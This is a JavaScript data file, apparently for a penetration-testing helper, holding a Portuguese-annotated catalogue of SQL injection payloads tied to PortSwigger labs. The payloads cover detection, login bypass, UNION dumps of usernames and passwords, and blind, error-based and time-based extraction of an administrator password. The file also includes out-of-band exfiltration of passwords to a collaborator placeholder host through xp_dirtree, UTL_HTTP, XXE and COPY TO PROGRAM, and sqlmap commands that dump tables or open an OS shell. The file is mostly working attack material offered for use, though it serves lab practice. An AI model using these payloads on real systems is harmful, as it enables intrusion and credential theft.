/**
 * SQLi Advice v3 — roteiros por técnica (PortSwigger + field).
 * Placeholder {{PARAM}} → SQLMAP_PARAM. Collaborator → BURP_COLLAB.
 * dbms: any | mysql | oracle | mssql | postgres
 * group: detect | logic | union | examine | blind | error | time | oast | bypass | handoff
 */
(() => {
  function nullList(n) {
    return Array.from({ length: n }, () => "NULL").join(",");
  }

  function stringAt(n, i, marker = "'abc'") {
    return Array.from({ length: n }, (_, j) => (j + 1 === i ? marker : "NULL")).join(",");
  }

  function buildCountPayloads(maxCols = 8) {
    const out = [];
    for (let n = 1; n <= maxCols; n++) {
      out.push({
        label: `ORDER BY ${n}`,
        value: `' ORDER BY ${n}--`,
        dbms: "any",
        note: "Último n sem erro = nº de colunas (ou o anterior).",
      });
    }
    for (let n = 1; n <= maxCols; n++) {
      out.push({
        label: `UNION ${n}×NULL`,
        value: `' UNION SELECT ${nullList(n)}--`,
        dbms: "any",
        note: "Alternativa ao ORDER BY. Erro some quando n bate.",
      });
    }
    return out;
  }

  function buildReflectPayloads(maxCols = 6) {
    const out = [];
    for (let n = 1; n <= maxCols; n++) {
      for (let i = 1; i <= n; i++) {
        out.push({
          label: `${n} cols · string na #${i}`,
          value: `' UNION SELECT ${stringAt(n, i)}--`,
          dbms: "any",
          note: "Se 'abc' aparecer na page, a coluna i aceita/reflete string.",
          cols: n,
        });
      }
    }
    return out;
  }

  window.HUNTER_SQLI_PAYLOADS = {
    version: 3,
    maxCols: 8,
    families: [
      { id: "all", label: "todas" },
      { id: "detect", label: "detect" },
      { id: "logic", label: "lógica" },
      { id: "union", label: "UNION" },
      { id: "examine", label: "examine DB" },
      { id: "blind", label: "blind bool" },
      { id: "error", label: "error-based" },
      { id: "time", label: "time" },
      { id: "oast", label: "OAST" },
      { id: "bypass", label: "bypass" },
      { id: "handoff", label: "sqlmap" },
    ],
    stages: [
      /* ─── DETECT ─── */
      {
        id: "detect",
        group: "detect",
        title: "1 · Detect / confirmar sink",
        lab: "Base de tudo (qualquer lab)",
        route: [
          "Baseline estável (mesmo request, cookies, auth).",
          "Injeta ' ou \" — erro SQL / 500 / body muda?",
          "Comenta resto: '-- / '-- - / '# (MySQL).",
          "Boolean: AND/OR true vs false — diff de body/len/status.",
          "Time: SLEEP/WAITFOR/pg_sleep se não houver oracle visual.",
          "Anota surface: query / body / cookie / header / JSON / XML.",
        ],
        hint: "Sem ponto confirmado, não sobe pra UNION/Intruder/sqlmap.",
        payloads: [
          { label: "break '", value: `'`, dbms: "any", note: "Erro de sintaxe?" },
          { label: 'break "', value: `"`, dbms: "any" },
          { label: "comment --", value: `'--`, dbms: "any", note: "MySQL: espaço ou ' após --" },
          { label: "comment -- -", value: `'-- -`, dbms: "any" },
          { label: "comment # MySQL", value: `'#`, dbms: "mysql" },
          { label: "OR true", value: `' OR 1=1--`, dbms: "any" },
          { label: "OR false", value: `' OR 1=2--`, dbms: "any" },
          { label: "AND true", value: `' AND '1'='1`, dbms: "any", note: "Mensagem / rows mudam?" },
          { label: "AND false", value: `' AND '1'='2`, dbms: "any" },
          { label: "AND true (num)", value: `1 AND 1=1`, dbms: "any", note: "Param numérico" },
          { label: "AND false (num)", value: `1 AND 1=2`, dbms: "any" },
          { label: "paren balance", value: `') AND ('1'='1`, dbms: "any", note: "Se query usa (…)" },
          { label: "SLEEP MySQL", value: `' AND SLEEP(3)--`, dbms: "mysql" },
          { label: "pg_sleep", value: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--`, dbms: "postgres" },
          { label: "WAITFOR MSSQL", value: `'; WAITFOR DELAY '0:0:3'--`, dbms: "mssql" },
        ],
      },

      /* ─── LOGIC ─── */
      {
        id: "where-hidden",
        group: "logic",
        title: "2 · WHERE · dados ocultos",
        lab: "PortSwigger: WHERE clause allowing retrieval of hidden data",
        route: [
          "Identifica filtro (ex.: category=Gifts) com AND released=1 no server.",
          "Injeta OR 1=1 (ou OR '1'='1') e comenta o resto.",
          "Confirma produtos unreleased / rows extras na UI.",
        ],
        hint: "Não é dump — só quebra a lógica do WHERE.",
        payloads: [
          { label: "OR 1=1--", value: `' OR 1=1--`, dbms: "any", note: "category=Gifts' OR 1=1--" },
          { label: "OR '1'='1", value: `' OR '1'='1`, dbms: "any" },
          { label: "OR true URL-ish", value: `'+OR+1=1--`, dbms: "any", kind: "shell", note: "Já encoded (lab solution)." },
          { label: "OR 1=1# MySQL", value: `' OR 1=1#`, dbms: "mysql" },
          { label: "num OR 1=1", value: `1 OR 1=1`, dbms: "any", note: "Sem aspas" },
        ],
      },
      {
        id: "login-bypass",
        group: "logic",
        title: "3 · Login bypass",
        lab: "PortSwigger: SQL injection vulnerability allowing login bypass",
        route: [
          "Intercepta POST login (username/password).",
          "Username: admin'--  (comenta AND password=…).",
          "Ou ' OR 1=1-- se não souberes o user.",
          "Password pode ser qualquer coisa se o comentário matar o check.",
        ],
        hint: "Prova = sessão autenticada. Não precisa extrair hash.",
        payloads: [
          { label: "admin'--", value: `administrator'--`, dbms: "any", note: "Username field" },
          { label: "admin'-- -", value: `administrator'-- -`, dbms: "any" },
          { label: "OR bypass user", value: `' OR 1=1--`, dbms: "any" },
          { label: "OR bypass user #", value: `' OR 1=1#`, dbms: "mysql" },
          { label: "admin')--", value: `administrator')--`, dbms: "any", note: "Se query usa (username)" },
          {
            label: "classic two-field",
            value: `admin' OR '1'='1`,
            dbms: "any",
            note: "Username; password qualquer / ' OR '1'='1",
          },
        ],
      },

      /* ─── UNION ─── */
      {
        id: "count",
        group: "union",
        title: "4 · UNION · nº de colunas",
        lab: "PortSwigger: UNION · determining the number of columns",
        route: [
          "Precisa de output na response (não blind puro).",
          "ORDER BY n até erro → n-1 = colunas.",
          "Ou UNION SELECT NULL,NULL… até bater tipos/nº.",
          "Filtra Cols no painel quando já souberes N.",
        ],
        hint: "MySQL às vezes quer espaço após -- . Oracle: FROM dual em alguns contextos.",
        payloads: buildCountPayloads(8),
      },
      {
        id: "reflect",
        group: "union",
        title: "5 · UNION · coluna que reflete string",
        lab: "PortSwigger: UNION · finding a column containing text",
        route: [
          "Com N colunas, mete 'abc' (ou string do lab) numa posição por vez.",
          "Onde a string aparece na page = slot pra dados.",
          "Tipos incompatíveis (NULL vs string) → troca posição.",
        ],
        hint: "Labs PortSwigger às vezes pedem string específica (não só abc).",
        payloads: [
          ...buildReflectPayloads(6),
          {
            label: "2-col · ambas string",
            value: `' UNION SELECT 'abc','def'--`,
            dbms: "any",
            cols: 2,
          },
        ],
      },
      {
        id: "extract",
        group: "union",
        title: "6 · UNION · extrair dados",
        lab: "PortSwigger: UNION · retrieve data / multiple values in one column",
        route: [
          "Troca o marker pela expressão (username, password, concat).",
          "Tabela users conhecida → dump direto; senão vai ao § examine.",
          "Várias cols numa: CONCAT / || / + com separador.",
        ],
        hint: "Ajusta nº de NULLs ao N do §4. Mete concat na coluna que refletiu.",
        payloads: [
          {
            label: "2-col username,password",
            value: `' UNION SELECT username,password FROM users--`,
            dbms: "any",
            cols: 2,
            note: "Lab clássico 2 cols string.",
          },
          {
            label: "MySQL CONCAT 1 col",
            value: `' UNION SELECT NULL,CONCAT(username,0x7e,password) FROM users--`,
            dbms: "mysql",
            note: "0x7e = '~'",
          },
          {
            label: "MySQL version",
            value: `' UNION SELECT NULL,@@version--`,
            dbms: "mysql",
          },
          {
            label: "MySQL database()",
            value: `' UNION SELECT NULL,database()--`,
            dbms: "mysql",
          },
          {
            label: "Oracle || users",
            value: `' UNION SELECT NULL,username||'~'||password FROM users--`,
            dbms: "oracle",
          },
          {
            label: "Oracle banner",
            value: `' UNION SELECT NULL,banner FROM v$version--`,
            dbms: "oracle",
          },
          {
            label: "Oracle dual version",
            value: `' UNION SELECT NULL,BANNER FROM v$version WHERE ROWNUM=1--`,
            dbms: "oracle",
          },
          {
            label: "Postgres ||",
            value: `' UNION SELECT NULL,username||'~'||password FROM users--`,
            dbms: "postgres",
          },
          {
            label: "Postgres version()",
            value: `' UNION SELECT NULL,version()--`,
            dbms: "postgres",
          },
          {
            label: "MSSQL +",
            value: `' UNION SELECT NULL,username+'~'+password FROM users--`,
            dbms: "mssql",
          },
          {
            label: "MSSQL @@version",
            value: `' UNION SELECT NULL,@@version--`,
            dbms: "mssql",
          },
          {
            label: "template 3-col MySQL",
            value: `' UNION SELECT NULL,CONCAT(a,0x7e,b),NULL--`,
            dbms: "mysql",
            cols: 3,
            note: "Mete CONCAT na posição que refletiu.",
          },
        ],
      },

      /* ─── EXAMINE DB ─── */
      {
        id: "version",
        group: "examine",
        title: "7 · Fingerprint DBMS / version",
        lab: "PortSwigger: querying database type and version",
        route: [
          "UNION path ou error-based refletindo versão.",
          "Oracle: v$version + dual. MySQL/MSSQL: @@version. Postgres: version().",
          "Sintaxe que só um engine aceita = fingerprint (|| vs + vs CONCAT, dual, SLEEP).",
        ],
        hint: "Versão ajuda a escolher cheatsheet (LIMIT vs TOP vs ROWNUM).",
        payloads: [
          { label: "MySQL @@version", value: `' UNION SELECT NULL,@@version--`, dbms: "mysql" },
          { label: "MySQL VERSION()", value: `' UNION SELECT NULL,VERSION()--`, dbms: "mysql" },
          { label: "MSSQL @@version", value: `' UNION SELECT NULL,@@version--`, dbms: "mssql" },
          { label: "Postgres version()", value: `' UNION SELECT NULL,version()--`, dbms: "postgres" },
          {
            label: "Oracle v$version",
            value: `' UNION SELECT NULL,banner FROM v$version--`,
            dbms: "oracle",
          },
          {
            label: "Oracle dual ping",
            value: `'||(SELECT '' FROM dual)||'`,
            dbms: "oracle",
            note: "Sem erro → muito provavelmente Oracle.",
          },
          {
            label: "SLEEP vs WAITFOR",
            value: `' AND SLEEP(2)--`,
            dbms: "mysql",
            note: "Delay = MySQL-ish. Sem delay → testa WAITFOR/pg_sleep.",
          },
        ],
      },
      {
        id: "schema",
        group: "examine",
        title: "8 · Schema · tables / columns / dump",
        lab: "PortSwigger: listing database contents (Oracle / non-Oracle)",
        route: [
          "1) Listar tables (information_schema / all_tables).",
          "2) columns WHERE table_name='…' (case! Users vs users vs USERS).",
          "3) Dump mínimo das cols interessantes.",
          "Oracle: sem information_schema clássico → all_tables / all_tab_columns.",
        ],
        hint: "Em UNION, seleciona só table_name / column_name na col que reflete.",
        payloads: [
          {
            label: "info_schema.tables (conceito)",
            value: `SELECT table_name FROM information_schema.tables`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "info_schema.columns (conceito)",
            value: `SELECT column_name FROM information_schema.columns WHERE table_name='Users'`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "MySQL · tables",
            value: `' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database()--`,
            dbms: "mysql",
          },
          {
            label: "MySQL · columns Users",
            value: `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='Users'--`,
            dbms: "mysql",
            note: "Se vazio → 'users'",
          },
          {
            label: "MySQL · GROUP_CONCAT cols",
            value: `' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--`,
            dbms: "mysql",
          },
          {
            label: "MySQL · dump",
            value: `' UNION SELECT NULL,CONCAT(username,0x7e,password) FROM users--`,
            dbms: "mysql",
          },
          {
            label: "MSSQL · tables",
            value: `' UNION SELECT NULL,table_name FROM information_schema.tables--`,
            dbms: "mssql",
          },
          {
            label: "MSSQL · columns",
            value: `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`,
            dbms: "mssql",
          },
          {
            label: "Postgres · tables",
            value: `' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='public'--`,
            dbms: "postgres",
          },
          {
            label: "Postgres · columns",
            value: `' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--`,
            dbms: "postgres",
          },
          {
            label: "Oracle · all_tables",
            value: `' UNION SELECT NULL,table_name FROM all_tables--`,
            dbms: "oracle",
          },
          {
            label: "Oracle · all_tab_columns",
            value: `' UNION SELECT NULL,column_name FROM all_tab_columns WHERE table_name='USERS'--`,
            dbms: "oracle",
            note: "UPPERCASE típico",
          },
          {
            label: "Oracle · dump",
            value: `' UNION SELECT NULL,username||'~'||password FROM users--`,
            dbms: "oracle",
          },
        ],
      },

      /* ─── BLIND BOOLEAN ─── */
      {
        id: "blind-response",
        group: "blind",
        title: "9 · Blind · conditional responses",
        lab: "PortSwigger: Blind SQLi with conditional responses",
        route: [
          "Oracle = diferença de comportamento (ex.: Welcome back), não o resultado SQL.",
          "TRUE: AND '1'='1 → mensagem; FALSE: '1'='2 → some.",
          "Confirma tabela/user com subquery = 'a'.",
          "LENGTH(password)>n (binary search).",
          "SUBSTRING/SUBSTR char a char + Intruder (a-z0-9) + Grep-Match na string oracle.",
        ],
        hint: "Cookie TrackingId comum. Surface sem output ≠ impossível.",
        payloads: [
          { label: "TRUE baseline", value: `' AND '1'='1`, dbms: "any", note: "Welcome back?" },
          { label: "FALSE baseline", value: `' AND '1'='2`, dbms: "any" },
          {
            label: "users exists LIMIT",
            value: `' AND (SELECT 'a' FROM users LIMIT 1)='a`,
            dbms: "any",
            note: "Oracle → §10 ROWNUM",
          },
          {
            label: "administrator exists",
            value: `' AND (SELECT 'a' FROM users WHERE username='administrator')='a`,
            dbms: "any",
          },
          {
            label: "LENGTH >1",
            value: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`,
            dbms: "any",
          },
          {
            label: "LENGTH >10",
            value: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a`,
            dbms: "any",
          },
          {
            label: "LENGTH >15",
            value: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>15)='a`,
            dbms: "any",
          },
          {
            label: "LENGTH >20",
            value: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a`,
            dbms: "any",
          },
          {
            label: "SUBSTRING pos1",
            value: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`,
            dbms: "any",
            note: "Intruder no 'a' · Grep Welcome back",
          },
          {
            label: "SUBSTRING pos2",
            value: `' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`,
            dbms: "any",
          },
          {
            label: "SUBSTRING pos3",
            value: `' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='a`,
            dbms: "any",
          },
          {
            label: "ASCII binary (opcional)",
            value: `' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')>97`,
            dbms: "any",
            note: "Binary search ASCII em vez de Intruder linear",
          },
          {
            label: "charset Intruder",
            value: `abcdefghijklmnopqrstuvwxyz0123456789`,
            dbms: "any",
            kind: "shell",
          },
        ],
      },

      /* ─── ERROR-BASED ─── */
      {
        id: "blind-error",
        group: "error",
        title: "10 · Blind · conditional errors (Oracle)",
        lab: "PortSwigger: Blind SQLi with conditional errors",
        route: [
          "' quebra; '' equilibra → erro é SQL.",
          "||(SELECT '' FROM dual)||' — Oracle exige FROM dual.",
          "Tabela fake → erro; users ROWNUM=1 → ok.",
          "CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END → erro se TRUE.",
          "LENGTH + SUBSTR + Intruder; HTTP 500 = hit.",
        ],
        hint: "Sem diff de rows; o erro/500 é o oracle. Oracle = SUBSTR.",
        payloads: [
          { label: "break '", value: `'`, dbms: "oracle" },
          { label: "balanced ''", value: `''`, dbms: "oracle" },
          {
            label: "SELECT '' (falha sem dual)",
            value: `'||(SELECT '')||'`,
            dbms: "oracle",
          },
          {
            label: "FROM dual OK",
            value: `'||(SELECT '' FROM dual)||'`,
            dbms: "oracle",
          },
          {
            label: "tabela fake",
            value: `'||(SELECT '' FROM not-a-real-table)||'`,
            dbms: "oracle",
          },
          {
            label: "users ROWNUM=1",
            value: `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`,
            dbms: "oracle",
          },
          {
            label: "CASE TRUE 1/0",
            value: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`,
            dbms: "oracle",
          },
          {
            label: "CASE FALSE 1/0",
            value: `'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`,
            dbms: "oracle",
          },
          {
            label: "administrator exists",
            value: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
          },
          {
            label: "LENGTH >1",
            value: `'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
          },
          {
            label: "LENGTH >20",
            value: `'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
            note: "Lab tip: length ≈ 20",
          },
          {
            label: "SUBSTR pos1",
            value: `'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
            note: "Status 500 = char certo",
          },
          {
            label: "SUBSTR pos2",
            value: `'||(SELECT CASE WHEN SUBSTR(password,2,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
          },
          {
            label: "SUBSTR pos3",
            value: `'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
          },
        ],
      },
      {
        id: "visible-error",
        group: "error",
        title: "11 · Visible error-based (dados no erro)",
        lab: "PortSwigger: Visible error-based SQL injection",
        route: [
          "Erro SQL ecoa na page (mensagem verbose).",
          "Força cast/XML/extract que inclui o dado na mensagem de erro.",
          "Extrai password/username direto do texto do erro — sem Intruder char-a-char.",
        ],
        hint: "Mais rápido que blind quando o erro vaza conteúdo.",
        payloads: [
          {
            label: "CAST AS INT (conceito)",
            value: `' AND 1=CAST((SELECT username FROM users WHERE ROWNUM=1) AS INT)--`,
            dbms: "oracle",
            note: "Erro tipa o valor no texto",
          },
          {
            label: "CAST password Oracle",
            value: `' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS INT)--`,
            dbms: "oracle",
          },
          {
            label: "EXTRACTVALUE MySQL",
            value: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='administrator'),0x7e))--`,
            dbms: "mysql",
            note: "XPATH syntax error ~dado~",
          },
          {
            label: "UPDATEXML MySQL",
            value: `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e),1)--`,
            dbms: "mysql",
          },
          {
            label: "CONVERT INT MSSQL",
            value: `' AND 1=CONVERT(INT,(SELECT TOP 1 password FROM users WHERE username='administrator'))--`,
            dbms: "mssql",
          },
          {
            label: "cast Postgres",
            value: `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)--`,
            dbms: "postgres",
          },
          {
            label: "XMLType Oracle (alt)",
            value: `' AND (SELECT XMLTYPE('<x>'||(SELECT password FROM users WHERE username='administrator')||'</x>') FROM dual) IS NOT NULL--`,
            dbms: "oracle",
            note: "Variante lab / cheatsheet",
          },
        ],
      },

      /* ─── TIME ─── */
      {
        id: "blind-time",
        group: "time",
        title: "12 · Blind · time delays",
        lab: "PortSwigger: Blind SQLi with time delays (+ info retrieval)",
        route: [
          "Sem UI oracle e sem erro útil → mede latência.",
          "Confirma delay fixo (SLEEP 5 / WAITFOR / pg_sleep / dbms_pipe).",
          "Condicional: IF/CASE WHEN (cond) THEN sleep ELSE 0.",
          "Extrai LENGTH e chars com delay = TRUE (Intruder + sort by time).",
        ],
        hint: "Ruído de rede: delay ≥3–5s. Threads baixas no Intruder.",
        payloads: [
          { label: "SLEEP 5 MySQL", value: `' AND SLEEP(5)--`, dbms: "mysql" },
          {
            label: "IF SLEEP cond MySQL",
            value: `' AND IF(1=1,SLEEP(5),0)--`,
            dbms: "mysql",
          },
          {
            label: "IF admin pass len MySQL",
            value: `' AND IF((SELECT LENGTH(password) FROM users WHERE username='administrator')>1,SLEEP(5),0)--`,
            dbms: "mysql",
          },
          {
            label: "IF SUBSTRING MySQL",
            value: `' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a',SLEEP(5),0)--`,
            dbms: "mysql",
            note: "Intruder no 'a'; time ≈5s = hit",
          },
          {
            label: "WAITFOR MSSQL",
            value: `'; WAITFOR DELAY '0:0:5'--`,
            dbms: "mssql",
          },
          {
            label: "IF WAITFOR MSSQL",
            value: `'; IF (1=1) WAITFOR DELAY '0:0:5'--`,
            dbms: "mssql",
          },
          {
            label: "pg_sleep",
            value: `'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`,
            dbms: "postgres",
          },
          {
            label: "pg_sleep SUBSTR",
            value: `'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`,
            dbms: "postgres",
          },
          {
            label: "dbms_pipe Oracle",
            value: `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)) ELSE '' END FROM dual)||'`,
            dbms: "oracle",
            note: "Delay ~5s se TRUE",
          },
          {
            label: "dbms_pipe SUBSTR Oracle",
            value: `'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)) ELSE '' END FROM users WHERE username='administrator')||'`,
            dbms: "oracle",
          },
        ],
      },

      /* ─── OAST ─── */
      {
        id: "oast",
        group: "oast",
        title: "13 · Blind · OAST (out-of-band)",
        lab: "PortSwigger: Blind SQLi with out-of-band (+ data exfil)",
        route: [
          "Sem response/time útil → força DNS/HTTP pra Collaborator.",
          "Gera payload BURP_COLLAB (Burp Collaborator / interactsh).",
          "Confirma interação (DNS lookup) = sink executa SQL.",
          "Exfil: concatena dado no subdomain (password.BURP_COLLAB).",
        ],
        hint: "Troca BURP_COLLAB pelo host do Collaborator. Depende de permissões/XP_DIRTREE, UTL_HTTP, COPY, etc.",
        payloads: [
          {
            label: "MSSQL xp_dirtree",
            value: `'; EXEC master..xp_dirtree '\\\\BURP_COLLAB\\a'--`,
            dbms: "mssql",
            note: "DNS lookup no Collaborator",
          },
          {
            label: "MSSQL exfil password",
            value: `'; DECLARE @p varchar(1024);SELECT @p=(SELECT password FROM users WHERE username='administrator');EXEC('master..xp_dirtree ''\\\\'+@p+'.BURP_COLLAB\\a''')--`,
            dbms: "mssql",
            note: "Simplificado — ajusta quoting ao contexto",
          },
          {
            label: "Oracle UTL_HTTP",
            value: `'||(SELECT UTL_HTTP.REQUEST('http://BURP_COLLAB') FROM dual)||'`,
            dbms: "oracle",
          },
          {
            label: "Oracle exfil EXTRACTVALUE DNS",
            value: `'||(SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP_COLLAB/"> %remote;]>'),'/l') FROM dual)||'`,
            dbms: "oracle",
            note: "Lab OAST exfil — valida no Collaborator",
          },
          {
            label: "Postgres COPY TO PROGRAM (conceito)",
            value: `'; COPY (SELECT '') TO PROGRAM 'nslookup BURP_COLLAB'--`,
            dbms: "postgres",
            note: "Só se role permitir; stacked",
          },
          {
            label: "MySQL LOAD_FILE UNC (raro)",
            value: `' OR LOAD_FILE('\\\\BURP_COLLAB\\a')--`,
            dbms: "mysql",
            note: "Depende secure_file_priv / OS",
          },
          {
            label: "placeholder host",
            value: `BURP_COLLAB`,
            dbms: "any",
            kind: "shell",
            note: "Cola o host do Collaborator nos payloads acima",
          },
        ],
      },

      /* ─── BYPASS / ADVANCED ─── */
      {
        id: "filter-bypass",
        group: "bypass",
        title: "14 · Filter / WAF bypass",
        lab: "PortSwigger: SQLi with filter bypass via XML encoding (+ tips)",
        route: [
          "Identifica o que é bloqueado (espaço, UNION, SELECT, aspas, keywords).",
          "Comentários inline /**/ no lugar de espaço; case misturado; double encoding.",
          "XML/JSON encoding se o parser decodifica antes do SQL (lab XML).",
          "CHAR()/CONCAT pra quebrar signatures de string.",
        ],
        hint: "Bypass ≠ magia — entende a camada (WAF vs app filter vs ORM).",
        payloads: [
          { label: "/**/ no espaço", value: `'/**/OR/**/1=1--`, dbms: "any" },
          { label: "UNION obfusc", value: `'/**/UNION/**/SELECT/**/NULL,NULL--`, dbms: "any" },
          { label: "UnIoN SeLeCt", value: `' UnIoN SeLeCt NULL,NULL--`, dbms: "any" },
          { label: "NULL sem espaço MySQL", value: `'UNION SELECT NULL,NULL--`, dbms: "mysql" },
          {
            label: "CHAR concat MySQL",
            value: `' AND password=CHAR(97,98,99)--`,
            dbms: "mysql",
            note: "abc sem aspas literais",
          },
          {
            label: "hex string MySQL",
            value: `' AND password=0x616263--`,
            dbms: "mysql",
          },
          {
            label: "XML entity idea",
            value: `&#x27;&#x20;OR&#x20;1=1--`,
            dbms: "any",
            kind: "shell",
            note: "Lab XML encoding: corpo XML com entities → SQL após decode",
          },
          {
            label: "tab/newline",
            value: "'\tOR\t1=1--",
            dbms: "any",
            note: "Whitespace alternativo",
          },
        ],
      },
      {
        id: "second-order",
        group: "bypass",
        title: "15 · Second-order SQLi",
        lab: "PortSwigger: Second-order SQL injection",
        route: [
          "Input A é stored 'safe' (escaped na escrita).",
          "Input A é reutilizado raw numa query B depois (perfil, troca senha, busca).",
          "Planta payload no store; triggera a feature que reconsulta.",
          "Prova no ponto B (WHERE username = '<stored>').",
        ],
        hint: "Payload no register/profile; explotação noutro endpoint.",
        payloads: [
          {
            label: "plant username",
            value: `admin'--`,
            dbms: "any",
            note: "Cria conta/atualiza display name com isto",
          },
          {
            label: "plant UNION-ish name",
            value: `x' UNION SELECT password FROM users WHERE '1'='1`,
            dbms: "any",
            note: "Depende de como B concatena",
          },
          {
            label: "checklist",
            value: `1) store payload  2) trigger query B  3) observar output/erro`,
            dbms: "any",
            kind: "shell",
          },
        ],
      },
      {
        id: "stacked",
        group: "bypass",
        title: "16 · Stacked queries",
        lab: "Field / MSSQL·Postgres (nem sempre MySQL)",
        route: [
          "Testa '; SELECT … -- ou '; WAITFOR …",
          "MySQL connectors muitas vezes NÃO permitem multi-statement.",
          "MSSQL/Postgres: mais comum. Impacto sobe (UPDATE/INSERT) — RoE!",
          "Prova mínima: time delay stacked, não drop table.",
        ],
        hint: "Prova com delay. Não destrói dados em engajamento real.",
        payloads: [
          {
            label: "stacked WAITFOR",
            value: `'; WAITFOR DELAY '0:0:5'--`,
            dbms: "mssql",
          },
          {
            label: "stacked pg_sleep",
            value: `'; SELECT pg_sleep(5)--`,
            dbms: "postgres",
          },
          {
            label: "stacked SELECT version MSSQL",
            value: `'; SELECT @@version--`,
            dbms: "mssql",
            note: "Só se a app devolver 2º resultset",
          },
          {
            label: "MySQL multi (raro)",
            value: `'; SELECT SLEEP(5)--`,
            dbms: "mysql",
            note: "Muitos drivers bloqueiam",
          },
        ],
      },

      /* ─── HANDOFF ─── */
      {
        id: "sqlmap",
        group: "handoff",
        title: "17 · sqlmap handoff",
        lab: "Depois do ponto manual",
        route: [
          "Exporta request Burp → req.txt (-r).",
          "Marca param / cookie (*).",
          "Technique: U UNION, B boolean, E error, T time, Q stacked.",
          "Blind: --string= / --code= / --time-sec=.",
          "Dump mínimo (-D -T --dump), não a farm inteira.",
        ],
        hint: "sqlmap sem ponto = ruído. RoE + rate (--delay).",
        payloads: [
          {
            label: "sqlmap -u -p",
            value: `sqlmap -u "$TARGET/?{{PARAM}}=1" $SQLMAP_OPTS -p {{PARAM}} --batch --dbs`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "sqlmap -r",
            value: `sqlmap -r req.txt $SQLMAP_OPTS -p {{PARAM}} --batch --dbs`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "technique banner",
            value: `sqlmap -r req.txt $SQLMAP_OPTS -p {{PARAM}} --technique=BEUSTQ --banner --batch`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "boolean --string",
            value: `sqlmap -r req.txt $SQLMAP_OPTS -p {{PARAM}} --technique=B --string="Welcome back" --batch`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "time-based",
            value: `sqlmap -r req.txt $SQLMAP_OPTS -p {{PARAM}} --technique=T --time-sec=5 --batch`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "cookie TrackingId",
            value: `sqlmap -r req.txt $SQLMAP_OPTS --cookie="TrackingId=*" -p TrackingId --batch --dbs`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "dump users",
            value: `sqlmap -r req.txt $SQLMAP_OPTS -p {{PARAM}} -D DB -T users --dump --threads 4`,
            dbms: "any",
            kind: "shell",
          },
          {
            label: "os-shell (só RoE)",
            value: `sqlmap -r req.txt $SQLMAP_OPTS -p {{PARAM}} --os-shell`,
            dbms: "any",
            kind: "shell",
            note: "MSSQL/MySQL file/ priv — evidência controlada",
          },
        ],
      },
    ],
  };
})();
